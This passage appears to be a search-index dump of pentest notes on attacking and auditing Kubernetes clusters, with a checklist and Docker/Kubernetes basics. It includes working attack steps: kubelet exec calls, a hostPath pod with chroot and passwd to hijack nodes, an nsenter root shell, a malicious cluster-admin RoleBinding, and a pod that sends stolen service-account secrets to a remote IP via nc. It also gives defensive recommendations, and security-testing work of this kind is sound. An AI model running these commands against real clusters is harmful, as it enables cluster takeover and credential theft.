rbac.authorization.k8s.io/v1beta1 metadata: name: mynamespace-user-view namespace: mynamespace subjects: - kind: ServiceAccount name: mynamespace-user namespace: mynamespace roleRef: apiGroup: rbac.authorization.k8s.io kind: Role name: mynamespace-user-full-access","title":"Components"},{"location":"attacking_kubernetes/attacking_kubernetes/#tools","text":"There are a number of tools that can facilitate the pentest or audit of a kubernetes network. kube-hunter Url: https://github.com/aquasecurity/kube-hunter The tool can audit from the external perspective or internal. It can perform a passive or active scans. In active scans the tool will actually exploit vulnerabilities. If you run this you may alter the cluster you are testing, so be careful. The tool can perform many checks such as: Passive Hunters: Mount Hunter - /var/log Hunt pods that have write access to host's /var/log. in such case, the pod can traverse read files on the host machine AKS Hunting Hunting Azure cluster deployments using specific known configurations Host Discovery Generates ip adresses to scan, based on cluster/scan type K8s Dashboard Discovery Checks for the existence of a Dashboard Kubelet Discovery Checks for the existence of a Kubelet service, and its open ports Kubelet Secure Ports Hunter Hunts specific endpoints on an open secured Kubelet Kubelet Readonly Ports Hunter Hunts specific endpoints on open ports in the readonly Kubelet server API Server Hunter Checks if API server is accessible Port Scanning Scans Kubernetes known ports to determine open endpoints for discovery It takes the local ip, and scans the entire range for open ports such as: 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Certificate Email Hunting Checks for email addresses in kubernetes ssl certificates API Service Discovery Checks for the existence of K8s API Services K8s CVE Hunter Checks if Node is running a Kubernetes version vulnerable to known CVEs Etcd Remote Access Checks for remote availability of etcd, its version, and read access to the DB Proxy Discovery Checks for the existence of a an open Proxy service Host Discovery when running as pod Generates ip adresses to scan, based on cluster/scan type Pod Capabilities Hunter Checks for default enabled capabilities in a pod Dashboard Hunting Hunts open Dashboards, gets the type of nodes in the cluster Api Version Hunter Tries to obtain the Api Server's version directly from /version endpoint Kubectl CVE Hunter Checks if the kubectl client is vulnerable to known CVEs Etcd service check for the existence of etcd service Access Secrets Accessing the secrets accessible to the pod Kubectl Client Discovery Checks for the existence of a local kubectl client Proxy Hunting Hunts for a dashboard behind the proxy API Server Hunter Accessing the API server using the service account token obtained from a compromised pod Active Hunters: Kubelet Container Logs Hunter Retrieves logs from a random container Prove /var/log Mount Hunter Tries to read /etc/shadow on the host by running commands inside a pod with host mount to /var/log Kubelet Run Hunter Executes uname inside of a random container K8s Version Hunter Hunts Proxy when exposed, extracts the version Build Date Hunter Hunts when proxy is exposed, extracts the build date of kubernetes Azure SPN Hunter Gets the azure subscription file on the host by executing inside a container API server hunter Accessing the api server might grant an attacker full control over the cluster Arp Spoof Hunter Checks for the possibility of running an ARP spoof attack from within a pod (results are based on the running node) Etcd Remote Access Checks for remote write access to etcd- will attempt to add a new key to the etcd DB Kubelet System Logs Hunter Retrieves commands from host's system audit DNS Spoof Hunter Checks for the possibility for a malicous pod to compromise DNS requests of the cluster (results are based on the running node)","title":"Tools"},{"location":"attacking_kubernetes/attacking_kubernetes/#external-pentest","text":"In an external pentest the scenario is that you do not have access to the kubernetes cluster at all. There is not that much kubernetes-specific attacks that can be performed. Mainly scan for open ports that might be related to kubernetes.","title":"External Pentest"},{"location":"attacking_kubernetes/attacking_kubernetes/#check-open-ports","text":"nmap <ip> -p 443/tcp - Kubernetes API server 2379/tcp - Etcd 2380/tcp - Etcd 6666/tcp - Etcd 4194/tcp - cAdvisor - Container Metrics 6443/tcp - Kubernetes API server 8443/tcp - Minikube API server 8080/tcp - Kubernetes API server 10250/tcp - Kubelet - HTTPS API with full node access 10255/tcp - Kubelet - Unauthenticated readonly. Pods/runnings pods/nodes 10256/tcp - Kube-proxy - Kube proxy health check server 9099/tcp - Calico Felix - Health check server for Calico 6782-4/tcp - Weave 44134/tcp - Tiller 44135/tcp - Tiller 30000-32767/TCP - Nodeport [ ] Check if the API-server is exposed externally If you have access to a configured kubectl you can retreive the IP-address of the master node with the following command: kubectl config view and then check for server: https://<ip> . The Kubernetes API server by default prohibits \"Anonymous\" users to interact with it. If a request is made without any bearer-token the user is given the username system:anonymous and the group system:unauthenticated . However, you never know it might be misconfigured and allow anonymous. [ ] Check if kubelet port 10255 is exposed - for information disclosure Kubelet is running on all worker nodes. It is running on port 10255, and no authentication is required. It is only possible to read from the API. It is meant to be exposed unauthenticated from inside the cluster. But not externally. Check to see if the port is accessible on all workers nodes external addresses: curl http://<external worker node ip>:10255/pods","title":"Check open ports"},{"location":"attacking_kubernetes/attacking_kubernetes/#internal-pentest","text":"","title":"Internal Pentest"},{"location":"attacking_kubernetes/attacking_kubernetes/#useful-recon-commands","text":"kubectl get nodes -o wide -A Get external IP of master node kubectl config view Get internal IP of master node kubectl get svc -o wide # The clusterIP is the internal IP to your master node Check the environment variables in the Pod: env #KUBERNETES_PORT_443_TCP_PROTO=tcp #KUBERNETES_PORT_443_TCP_ADDR=10.39.240.1 #KUBERNETES_SERVICE_HOST=10.39.240.1 #KUBERNETES_PORT=tcp://10.39.240.1:443 #KUBERNETES_PORT_443_TCP_PORT=443 # This will resolve to a Service IP which in turn will be routed to the API server. host kubernetes.default.svc Get IP:s of worker nodes If you have access to kubectl . kubectl get nodes -o wide If you have kubectl and want to run it with a service-token: kubectl --insecure-skip-tls-verify=true --server=\"https://<internal or external kube-apiserver ip>:443\" --token=\"eyJ[...]\" get pods If you are in a pod with kube-hunter you can run: python kube-hunter --interface --mapping What is basically does is that it performs a port-scan of the entire range of the pods internal IP-address. It looks for ports like 8001, 8080, 10250, 10255, 30000, 443, 6443, 2379 Check what node a pod is running on kubectl get pod <name-of-pod> -o yaml Port scan the cluster Check your ip and subnet in the pod: ip a Scan the cidr for interesting ports, you will find other Pods and other nodes. nmap 10.36.0.1/24 -p 8001,8080,10250,10255,30000,443,6443,2379","title":"Useful recon commands"},{"location":"attacking_kubernetes/attacking_kubernetes/#basic-tests","text":"[ ] Check for anonymous access to kube-apiserver See \"Useful recon commands\" how to get the external or internal IP of the kube-apiserver. The entire kube-apiserver API documentation is found here: https://docs.openshift.com/container-platform/3.3/rest_api/kubernetes_v1.html By default interesting API endpoints are restricted by default, but you never know until you try. curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/componentstatus curl -k https://<external or internal ip to kube-apiserver>:443/api/v1/namespaces/default/secrets You should get a response with Forbidden if it doesn't work. [ ] Check for anonymous access to ETCD Etcd by default does not allow anonymous access to its database, but you never know. kube-hunter checks for the existence of an etcd service on the subnet. It also checks if the user has read access to it. curl http://<internal or external ip>:2379/version curl http://<internal or external ip>:2379/v2/members curl http://<internal or external ip>>:2379/v2/keys/?recursive=true # Or using the etcdctl tool etcdctl -endpoints=http://<MASTER-IP>:2379 get / -prefix -keys-only In GKE port 2379 is only available to the Master API through the loop-back interface. So the port is not exposed externally or on the internal network. [ ] Check if kubelet port 10250 is accessible unauthenticated. Kubelet is a service that is running on the worker nodes. It is just a REST API running on port 10250 and 10255. The idea of the Kubelet API is to receive instructions from the kube-apiserver service on the master node. Since it is not meant for human users its API is actually not documented. But by reading the source we know a little bit about it. For example, the following endpoints: curl -k https://workernode:10250/pods curl -k https://k8-node:10250/runningpods/ Lists running pods curl -k https://workernode:10250/exec Executes a command in a container, and returns a link to view the output. If you get \"Unauthorized\" well, then anonymous users are not authorized to access the API. If you get a response to the /pods request, it might mean that it allows anonymous authentication. Which means that you might be able to RCE the pods. By using the exec endpoint you can execute commands on other pods. curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=ls -la /\" # You can also check the environment variable to see if you can get the kubelet token: curl -k -XPOST \"https://k8-node:10250/run/kube-system/kube-dns-5b1234c4d5-4321/dnsmasq\" -d \"cmd=env\" For reference on how to exploit this see: http://carnal0wnage.attackresearch.com/2019/01/kubernetes-unauth-kublet-api-10250_16.html [ ] Check kubelet port 10255 (read only) for information disclosure Kubelet is running on port 10255, but is read-only. It is nothing to report if it is only available on the inside of the cluster, but it should not be exposed externally. It can still be useful to an attacker inside the cluster, as a way to gather information. curl -k http://10.36.2.1:10255/pods [ ] Check for Service account secret / token If no service account is specified for a Pod, the Pod is automatically assigned the default service account in the namespace. Each pod is provided with a service account by default. The extent of the priviliges that is given to that account is configurable. So it is best to just verify it by testing it. The secret token is created and put in a volume that is automatically mounted to pods with the default service account. You can access the service account token (A JWT) in the Pod at the following path: /var/run/secrets/kubernetes.io/serviceaccount/token You can take the JWT and try to authenticate to the kube-apiserver like this: Note that the port can be 443 or 6443. So try both. curl -k -H \"Authorization: Bearer eyJhbG[...] \" https://<masternode ip>:443/api/v1/namespaces/default/secrets Another way to do it is with kubectl like this: kubectl --insecure-skip-tls-verify=true --server=\"https://<masternode-ip>:443\" --token=\"eyJh[...]\" get secrets --all-namespaces -o json kube-kunter also performs this check when running with the --pod flag, like this python kube-hunter.py --pod Reference to hack: https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0 Recommendation You can configure an admission controller to not automatically mount the token. [ ] Check for CVE-2018\u20131002105 The vulnerability allows users permitted to one namespace to interact with the Master API in other namespaces. It is easy to test for, the issue is fixed in the following versions, and above: v1.10.11 v1.11.5 v1.12.3 kubectl version For how to exploit it see: https://blog.appsecco.com/analysing-and-exploiting-kubernetes-apiserver-vulnerability-cve-2018-1002105-3150d97b24bb https://gravitational.com/blog/kubernetes-websocket-upgrade-security-vulnerability/ [ ] Check for usage of Helm There is a kubernetes package manager called Helm. Helm consists of a Client, which is the Helm Client. ANd a server, called Tiller server. The Helm repository is just a simple webserver from which you can search and find packages. Tiller is a server running the cluster. [ ] HostPath - Mount worker node root directory to Pod If you have an account that can deploy pods, you can mount the node workers root directory into the pod. And thereafter access the node workers root directory, and for example change the password of a user, which you can then use to ssh into the node. This attack can be performed in the following way: Create a new pod, like the following, and aplly it: kubectl apply -f testdeployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: testpod-deployment labels: app: testpod spec: replicas: 1 selector: matchLabels: app: testpod template: metadata: labels: app: testpod spec: containers: - name: testpod image: gcr.io/kuberntest/kubeaudit:latest volumeMounts: - mountPath: /root name: rooten volumes: - name: rooten hostPath: path: / Now you can just use chroot and change the password of a user, and then ssh into the node worker with that user. cd /root chroot /root /bin/bash passwd <someuser> In order to perform this attack against all the node-workers it is posssible to deploy a DaemonSet. A DaemonSet is a workload that ensures that a Pod is run on all worker nodes. If new worker nodes are added to the cluster the DaemonSet will ensure that each has the specified pod running on it. It can be sueful if you want to run a logs collection daemon on all nodes, or a monitoring daemon. Those pods usually mount the nodes log directory to the pod. This can be used to ensure that out malicious pod available on all worker nodes. Recommendation You can create a PodSecurityPolicy that disallows pods from mounting the root directory from the Host. You can also create a network policy that disallows outgoing traffic, thus preventing reverse shells a bit. [ ] Check if running Kubelet on master node If you are running kubelet on a master node, and the user is able to mount a directory from the host into the pod, then you will be able to gain access to the etcd certificates. With these certificates it is possible to comunicate directory to etcd, and thereby retreive secrets/tokens of high priviliged users. Note that in your manifest file you can specify which node you want to deploy your POD on. By doing that you can specify that you want to deploy your pod on the master node (if that node is running kubelet). This means that the scheduler, is not a security boundry, you can simply just bypass the scheduler. The attack is explained here, around minute 16: https://www.youtube.com/watch?v=HmoVSmTIOxM Recommendation Don't run kubelet on the control plane (On the master-node) Don't allow mounting of HostPath Sheduler is not a security component - exact node can be specified in the POD manifest [ ] Check for Docker-in-Docker Some people want to run docker in a Pod. In order to do that they usually mount the worker-node docker-socket into the Pod. This is usually done using hostPath in the pod/deployment manifest file. The docker api is unauthenticated, so anyone with access to the socker can interact with it. To check for it grab all the deployment and pod manifest-files, and search for: hostPath: path: /var/run/docker.sock Note that this attack works evern though privilige-escalation is denied, and the Pod is running as a non-root user. So, if the docker-socket is mounted, a user within the Pod can run a docker-container on the underlying host, the worker node, for example. If you can do that, you can mount a worker node directory, such as /etc, to your docker container, and from there gain access to the underlying filesystem. Recommendation Don't mount the docker-socket to a Pod. Restrict usage of hostPath with an admission controller. [ ] Check for HostPid allow So just like you are able to escalate priviliges by mounting in the host root directory, it is also possible to escalate priviliges if you are allowed to create a Pod with the hostPid . See how to attack this here: https://www.youtube.com/watch?v=HmoVSmTIOxM If the Pod is deployed with these settings: securityContext: priviliged: true hostPID: true It means that you can run the following command in the Pod to get a root shell on the underlying host: sudo nsenter -a -t 1 bash Recommendation Use the adminission controller Pod Security Policy and disallow hostPid. Restrict the use of \"priviliged\" containers [ ] Check which services are exposed When an application is deployed, through a Pod or Deployment, it will not automatically become available to users outside the kubernetes cluster. In order to direct traffic to those services a kubernetes service is needed. We need to check what services are exposed externally, to see if any sensitive servicea accidentally has been expoesed. If those services are vulnerable or not can be considered out of scope (we are not testing the applications hosted on the cluster). But some kubernetes specific services might be exposed, and that might constitute a finding. kubectl get services -A -o wide [ ] Check which versions kubernetes components are running A kubernetes cluster consist of many components, and those components vary from cluster to cluster. Some of these components are vulnerable, for example older Traefik versions are vulnerable to RCE. You can check which versions the components have by checking which image they use, this can be Check which image versions of deployments: kubectl describe deployments -A","title":"Basic tests"},{"location":"attacking_kubernetes/attacking_kubernetes/#authorization","text":"There are some quirks regarding the authorization system that might be interesting. For example, a user (maybe even a service account) might have the right to execute commands on pods, but it might not have the right to deploy new pods. If that is the case then it is possible to simply execute a command on other pods and extract the auto-mounted credentials, and then use those credentials to, for example, deploy a new pod. In this way it is possible to escalate in priviliges within a cluster. The most basic components of RBAC (Roles Based Access Control) are the following: ClusterRoles A ClusterRole applies to the whole cluster. Roles A normal Role only applies to a specific namespace. ClusterRoleBindings RoleBindings RBAC grant access to resources with specifc verbs, like get , describe . A resource is basically information that can be access. Secrets, pod information etc. The verbs specify how the resource can be access, get,list,watch etc. RoleBindings and ClusterRoleBinding is of course the way we bind a specific role to a specific user. One tool that I have found that can be of interest is this: https://raw.githubusercontent.com/cyberark/kubernetes-rbac-audit/master/ExtensiveRoleCheck.py https://github.com/cyberark/kubernetes-rbac-audit kubectl get roles --all-namespaces -o json > Roles.json kubectl get clusterroles -o json > clusterroles.json kubectl get rolebindings --all-namespaces -o json > rolebindings.json kubectl get clusterrolebindings -o json > clusterrolebindings.json python ExtensiveRoleCheck.py --clusterRole clusterroles.json --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json To list service accounts: kubectl get serviceaccounts -A [ ] Check for interesting user and service account rights One kind of complicated way to test what a specific user can do is to run the following # Check if your current user can run `exec` on pods. kubectl auth can-i exec pods kubectl auth can-i get pods Take low priviliged account that you have been given or compromised, and use that account when you run: kubectl auth can-i --list kubectl auth can-i --list -n SomeNameSpace So what to look for? Look for the verb list together with secrets . That might mean that you can list other users secrets, and steal their JWT token. Resource Verb Comment secrets list or * secrets get * get Can be used to get secrets. asdasdlasdhaklw Can be used to get secrets. [ ] Check for CVE: CVE-2018-18264 Privilige Escalation kubectl proxy 8001 In your browser go to http://localhost:8001 If you can access it, klick on \"skip\" for the authentication. The go to URL: /api/v1/namespaces/kube-system/secrets/kubernetes-dashboard-certs and see if you can get some secrets. The simple way to check this is to see if the kubernetes version is below: 1.10.1 kubectl version https://sysdig.com/blog/privilege-escalation-kubernetes-dashboard/ [ ] Create Pod in kube-system namespace and automount service account So if you have a kubernetes user that can deploy pods in any namespace you can mount in a high priviliged service account into the the pod, and then extrct those credentials. This can be done in the following way. Deploy the following pod: apiVersion: v1 kind: Pod metadata: name: alpinetest namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true This technique can be used if your user does not have the permission to list secrets, but is allowed to deploy pods in any namespace. Also, you do not have to have the exec permission to use the attack. You can deploy the pod to automatically send the credentials, like this: apiVersion: v1 kind: Pod metadata: name: alpine namespace: kube-system spec: containers: - name: alpine image: alpine command: [\"/bin/sh\"] args: [\"-c\", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H \"Authorization: Bearer $TOKEN\" -H \"Content-Type: application/json\" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000'] serviceAccountName: bootstrap-signer automountServiceAccountToken: true hostNetwork: true [ ] Deploy pods using Create/update deployment, Daemonsets, statefulsets,Replicationcontrollers, Replicasets, Jobs, Cronjobs There are many ways to deploy pods. Even if your user is not allowed to create a pod it might be possible to create pods using other types of workloads. All these ways can be used to deploy pods and possibily escalate priviliges using the technique explained in the issue above. Workloads that can be used to create pods are the following: Create/update deployments Daemonsets Statefulsets Replicationscontrollers Replicasets Jobs Cronjobs Readthe documentation for each for in order to see how to do it. As in the attack above you will need to be able to deploy in the namespace kube-system . https://www.cyberark.com/threat-research-blog/kubernetes-pentest-methodology-part-1/ [ ] Privilige to use Pods/Exec This is pretty simple. But if your user has the permission to perform pods/exec with any namespace you can simply enter into any pod, and extract the default service accounts. kubectl exec -it <POD NAME> -n <POD\u2019S NAMESPACE> -- sh [ ] Privilege to Get/patch rolebindings The idea here is if your user has the permission to edit rolebindings that use can simply bind a user to the ClusteAdmin role and thereby escalate priviliges to the highest. Check your priviliges with your low priviliges user with the following command: kubectl auth can-i --list If you have the permission to create Rolebindings you can create a malicious rolebinding like this: You might have to change the namespace and the service account to your service account and namespace. { \"apiVersion\": \"rbac.authorization.k8s.io/v1\", \"kind\": \"RoleBinding\", \"metadata\": { \"name\": \"malicious-rolebinding\", \"namespace\": \"default\" }, \"roleRef\": { \"apiGroup\": \"*\", \"kind\": \"ClusterRole\", \"name\": \"admin\" }, \"subjects\": [ { \"kind\": \"ServiceAccount\", \"name\": \"default\", \"namespace\": \"default\" } ] } If it works you can use the token of the service account to do anything to want in the cluster. [ ] Check for impersonation privileges There exists a functionality to impersonate service accounts. This can be used if you want to check that a a serviceaccount has apropriate priviliges, but it can also be used for malicious intents. curl -k -v -XGET -H \u201cAuthorization: Bearer <JWT TOKEN (of the impersonator)>\u201d -H \u201cImpersonate-Group: system:masters\u201d -H \u201cImpersonate-User: null\u201d -H \u201cAccept: application/json\u201d https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/ [ ] Check if RBAC is used Role-Based Access Control has been the stable since version 1.8 RBAC is enabled by the apiserver by starting the apiserver with this flag --authorization-mode=RBAC If you don't ahve access to the apiserver flags you can check it interactivly by running: kubectl api-versions If you see the following output RBAC is enabled: rbac.authorization.k8s.io/v1 rbac.authorization.k8s.io/v1beta1 If Kubernetes is run as a managed cluster with Azure you can check if with the following: az aks list Check for: RBAC true However, it is still possible to disable. Do check that it is enabled.","title":"Authorization"},{"location":"attacking_kubernetes/attacking_kubernetes/#security-audit","text":"The security audit is a profile used when the tester has a kubernetes user with read privileges and is able to talk to the apiserver. [ ] Check if PodSecurityPolicy is supported It might be that kubernets is started without enabling PSP. kubectl get psp If PSPS is not supported, or enabled you will get the following error: the server doesn't have a resource type \"podSecurityPolicies\". If it is supported you get either the policies or an error such as: No resources found Recommendation Enable PSP. This is done differently according to the vendor. In Minikube it can be done the following way: minikube start --extra-config=apiserver.GenericServerRunOptions.AdmissionControl=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds,PodSecurityPolicy [ ] Check if PodSecurityPolicy is used Remember to add the -A flag, so that you can view the podsecurity policies in all namespaces. kubectl get psp -A kubectl describe psp Inspect the PSPs. Now you need to figure out which PSPs are actually used. PSPs are applied to Pods using annotations. If you are clusteradmin, and can check all pods in all namespaces, you can run the following command: kubectl describe pods -A Now check the annotations part to see which PSP is applied to each Pod. The annotation part usually look something like this: Annotations: kubernetes.io/psp: <name of PSP> [ ] Static analysis of yaml files - Searching for secrets Secrets should not be stored in the yaml configuration for workloads such as pods, deployments, jobs etc. Maybe a secret is stored in an environment variable in the a yaml, and that yaml is accessible to everyone. kubectl describe pods -A kubectl describe deployments -A There are a lot of other bad configurations that can be introduced. One way to check these is with the tool kubesec. I have not used this tool, and not audited it. So run it on your own responsibility. https://kubesec.io/ I think you can just output the yaml file and then run it in kubesec. kubectl describe deployments -A > describe-deployments.txt cat -n describe-deployments.txt | sed -n '/Environment/,/Mount/p' kubectl get pod kubeaudit-6f5964556b-5vnk5 -o yaml [ ] Check that pods are running as non-root users By having the services on the containers running as a non-root user it makes it more difficult for an attacker to escape the the container to the host os. The container is sandboxed from other containers running on the host with the help of linux namespaces. It is more probable that a container breakout is possible if the pod is running as root. Another reason to not run a service as root is that if kubernetes has been misconfigured to accidentally expose volumes to the container, the volume will still not be able to mount because of lacking root priviliges. This can be verified the following way, albeit not perfectly. This way will only show if the service in the container is running as root or some other user. It might be that it is possible to run sudo su and escalate priviliges. kubectl -n thenamespace exec mypod whoami and kubectl -n thenamespace exec -it mypod /bin/bash Therefore it is better to configure a PodSecurityPolicy to handle the problem. It is possible to create a PodSecurityPolicy that disallows containers to run as root. If such a policy exists the apiserver will disallow the deployment of a container that is running as root. The following lines in a PodSecurityPolicy disallows containers from running as root. # Required to prevent escalations to root. allowPrivilegeEscalation: false runAsUser: # Require the container to run without root privileges. rule: 'MustRunAsNonRoot' One issue that might occur here is that the app cant use ports below 1024. This can be solved by running the app on a higher port, by expose it on a lower. An example of this could be the following: kind: Service apiVersion: v1 metadata: name: my-service spec: selector: app: MyApp ports: - protocol: TCP port: 443 targetPort: 8443 https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/ [ ] Check the usage of network policies NetworkPolicy is just a kubernetes-word for firewall. By default all pods in the kubernetes cluster is allowed to talk to all pods. There is not segmentation between pods. This can be restricted with network policies. kubectl get networkpolicies -A This is an example of a network policy: apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: myapp-deny-external-egress spec: podSelector: matchLabels: app: myapp policyTypes: - Egress egress: - ports: - port: 53 protocol: UDP - to: - namespaceSelector: {}","title":"Security Audit"},{"location":"attacking_kubernetes/attacking_kubernetes/#resources","text":"https://dev.to/petermbenjamin/kubernetes-security-best-practices-hlk","title":"Resources"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/","text":"How to list users and service accounts? How to list those privikliges? What is ABAC and RBAC? This checklist maps to the file \"Attacking Kubernetes\". External Pentest # Check open ports 443/tcp - Kubernetes API server 2379/tcp - Etcd 2380/tcp - Etcd 6666/tcp - Etcd 4194/tcp - cAdvisor - Container Metrics 6443/tcp - Kubernetes API server 8443/tcp - Minikube API server 8080/tcp - Kubernetes API server 10250/tcp - Kubelet - HTTPS API with full node access 10255/tcp - Kubelet - Unauthenticated readonly. Pods/runnings pods/nodes 10256/tcp - Kube-proxy - Kube proxy health check server 9099/tcp - Calico Felix - Health check server for Calico 6782-4/tcp - Weave 44134/tcp - Tiller 44135/tcp - Tiller 30000-32767/TCP - Nodeport [ ] Check if API-server is exposed externally [ ] Check kubelet port 10255 (read only) for Information disclosure Internal Pentest # Basic tests # [ ] Check for anonymous access to kube-apiserver [ ] Check for anonymous access to etcd [ ] Check if kubelet port 10250 is accessible unauthenticated [ ] Check if kubelet port 10255 (read only) for Information disclosure [ ] Check for Service account secret / token [ ] Check for CVE-2018\u20131002105 [ ] Check f\u00f6r usage of Helm [ ] HostPath - Mount Worker node root to pod [ ] Check if running Kubelet on master node [ ] Check for Docker-in-Docker [ ] Check for HostPid allow [ ] Check which services are exposed [ ] Check which versions kubernetes components are running Authorization / Privilige escalation # [ ] Check for interesting user and service account rights [ ] Check for CVE: CVE-2018-18264 Privilege Escalation [ ] Create Pod in Kube-system namespace and automount service account [ ] Deploy Pods using Create/update deployment, Daemonsets, statefulsets, ReplicationsControllers, Replicasets, Jobs, Cronjobs [ ] Privilege to use Pods/exec [ ] Privilege to Get/Patch rolebindings [ ] Check for impersonation privileges [ ] Check if RBAC is used Security Audit # [ ] Check if PodSecurityPolicy is supported [ ] Check if PodSecurityPolicy is used [ ] Static analysis of YAML files [ ] Check that pods are running as non-root users [ ] Check the usage of network policies","title":"Attacking Kubernetes Checklist"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/#external-pentest","text":"Check open ports 443/tcp - Kubernetes API server 2379/tcp - Etcd 2380/tcp - Etcd 6666/tcp - Etcd 4194/tcp - cAdvisor - Container Metrics 6443/tcp - Kubernetes API server 8443/tcp - Minikube API server 8080/tcp - Kubernetes API server 10250/tcp - Kubelet - HTTPS API with full node access 10255/tcp - Kubelet - Unauthenticated readonly. Pods/runnings pods/nodes 10256/tcp - Kube-proxy - Kube proxy health check server 9099/tcp - Calico Felix - Health check server for Calico 6782-4/tcp - Weave 44134/tcp - Tiller 44135/tcp - Tiller 30000-32767/TCP - Nodeport [ ] Check if API-server is exposed externally [ ] Check kubelet port 10255 (read only) for Information disclosure","title":"External Pentest"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/#internal-pentest","text":"","title":"Internal Pentest"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/#basic-tests","text":"[ ] Check for anonymous access to kube-apiserver [ ] Check for anonymous access to etcd [ ] Check if kubelet port 10250 is accessible unauthenticated [ ] Check if kubelet port 10255 (read only) for Information disclosure [ ] Check for Service account secret / token [ ] Check for CVE-2018\u20131002105 [ ] Check f\u00f6r usage of Helm [ ] HostPath - Mount Worker node root to pod [ ] Check if running Kubelet on master node [ ] Check for Docker-in-Docker [ ] Check for HostPid allow [ ] Check which services are exposed [ ] Check which versions kubernetes components are running","title":"Basic tests"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/#authorization-privilige-escalation","text":"[ ] Check for interesting user and service account rights [ ] Check for CVE: CVE-2018-18264 Privilege Escalation [ ] Create Pod in Kube-system namespace and automount service account [ ] Deploy Pods using Create/update deployment, Daemonsets, statefulsets, ReplicationsControllers, Replicasets, Jobs, Cronjobs [ ] Privilege to use Pods/exec [ ] Privilege to Get/Patch rolebindings [ ] Check for impersonation privileges [ ] Check if RBAC is used","title":"Authorization / Privilige escalation"},{"location":"attacking_kubernetes/attacking_kubernetes_checklist/#security-audit","text":"[ ] Check if PodSecurityPolicy is supported [ ] Check if PodSecurityPolicy is used [ ] Static analysis of YAML files [ ] Check that pods are running as non-root users [ ] Check the usage of network policies","title":"Security Audit"},{"location":"attacking_kubernetes/basics_of_docker/","text":"Create image # You can define a docker-container by creating the file Dockerfile. The Dockerfile is a configuration-file that specifies what should be running in the container. A Container is a runtime instance of an image. The FROM keyword is used to define from what base-image you want to build upon. You can choose anything available on dockerhub for example. FROM debian:latest After you have created a Dockerfile you need to build it to be able to run it. When you build it all the package inside the Dockerfile will be downloaded. sudo docker build --tag nameofcontainer . Now you can check out the","title":"Basics of Docker"},{"location":"attacking_kubernetes/basics_of_docker/#create-image","text":"You can define a docker-container by creating the file Dockerfile. The Dockerfile is a configuration-file that specifies what should be running in the container. A Container is a runtime instance of an image. The FROM keyword is used to define from what base-image you want to build upon. You can choose anything available on dockerhub for example. FROM debian:latest After you have created a Dockerfile you need to build it to be able to run it. When you build it all the package inside the Dockerfile will be downloaded. sudo docker build --tag nameofcontainer . Now you can check out the","title":"Create image"},{"location":"attacking_kubernetes/basics_of_kubernetes/","text":"Random notes about random stuff concerning kubernets. Here goes. It can be beneficial to divide the componenets of Kubernetes into Software and Hardware. So let's start with the hardware. Hardware # A kubernets cluster is the sum of all kubernetes nodes. A node will likely be a physical machine or a virtual machine in a datacenter. A program can run on any of the nodes. It can change, so the program should not be storing data on a specific node, because the program might end up running on another node. To store data persistently Kubernetes uses Persistent volumes. This can be a local or a cloud drive. Think of it has an external harddrive that you plug into your cluster. Persistent volumes can be mounted to the kubernetes kluster, at which point it is accessible from all nodes. Software # Programs running in the kubernetes klusters are package in containers. The most common and popular one is of course Docker. You usually have one service per container. Pods # Containers are run in Pods. If you application becomes really popular, and can't handle the load, you can simply configure your Pod to have more replicas. Pods can hold serveral containers, but it might be better to just have one container in each pod. Since you might want to scale up only one container, and not all the other containers in the pod. You might waste a lot of resources if you scale up a Pod that containes containers that does not need to be scaled up. Deployment # Deployment is an abstraction that defines how many replicas of pods you want. Using deployment you will not deal with pods directly. Ingress # Kubernetes provides a firewall between the outside of the kluster and the inside. However between the pods there are not default firewalls. Admission controller / PodSecuriyPolicy # Admission controller sits between the client and the master-api, it kind of works as a filter and a check. The most important admission controller, from a security perspective, is PodSecurityPolicy. You can list the PSP by running this command: kubectl get psp -A - Read the specifications of a specific PSP kubectl describe psp privilege So, how do we implement a PSP? It involved three steps: 1. Create PSP 2. Create a Role that is associated with the PSP 3. Create a Rolebinding that binds the Role to a user, serviceaccount or group. After that the PSP will be implmented for those specific users that are associated through the rolebinding. So, PSP is not set in the manifest file of pod or deployment. The PSP is instead associated to a user through the rolebinding. Setting up a kubernetes cluster in GCLoud # After you have installed GCloud CLI, enabled billing,, and Enabled Kubernets API for your specific project you can create a kluster like this: gcloud container clusters create my-cluster --zone us-west1-a You can start to manage your cluster with kubectl, but first you need to setup credentials to do it: gcloud container clusters get-credentials my-cluster --zone us-west1-a --project kuberntest If you go to the gcloud console you can see that the Kubernetes cluster is created. And if you go to Computer you can see three VM instances created, these are your nodes. If you want to remove them you should do that through kubernetes and not though gcloud, because if you remove those VMs the cluster will just spin up new VMs. Now you can deploy a service to your kluster with the following command Where gitea.yaml is a yaml-config file, which incluldes a docker-image from dockerhub. kubectl apply -f gitea.yaml The file looks like this: apiVersion: v1 kind: Pod metadata: name: gitea-pod spec: containers: - name: gitea-container image: gitea/gitea:1.4 You can now check your pods with this command: kubectl get pods Components # This image describes the components of kubernetes pretty well: Some interesting things to note here is that the API server is the only component that should talk to etcd. Etcd # Etcd contains all the state of the cluster. It contains information, such as cloud metadata, credentials. It is a key-value database. Etcd is the final word of the state of cluster. So if you have write priviliges to the etcd database you basically own the cluster. Api-server # If you control the api-server, either through a shell or with a user with 